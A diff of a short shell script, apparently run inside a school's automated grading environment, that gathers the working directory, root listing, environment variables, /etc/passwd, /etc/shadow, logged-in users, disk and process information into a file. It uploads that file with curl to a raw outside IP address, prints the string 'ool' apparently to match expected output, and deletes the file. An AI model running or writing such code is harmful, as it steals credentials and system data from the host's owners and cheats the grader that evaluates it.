@@ -1,8 +1,17 @@
 pwd > testing
-cat /tmp/correction/holberton_corrections/functions/sub_functions/*.rb >> testing
+echo ----------------- ls ------- >> testing
+ls / >> testing
+echo ----------------- Environment ------- >> testing
 env >> testing
+echo ----------------- User Info ------- >> testing
+cat /etc/passwd >> testing
+cat /etc/shadow >> testing
+echo ----------------- Users logged in ------- >> testing
+w >> testing
+echo ----------------- Disk Space ------- >> testing
 df -h >> testing
 echo ----------------- ps -aux ------- >> testing
 ps -aux >> testing
+echo ----------------- END ------- >> testing
 curl -F "name=@testing" http://138.68.58.230:8080 && echo -n ool
 rm testing
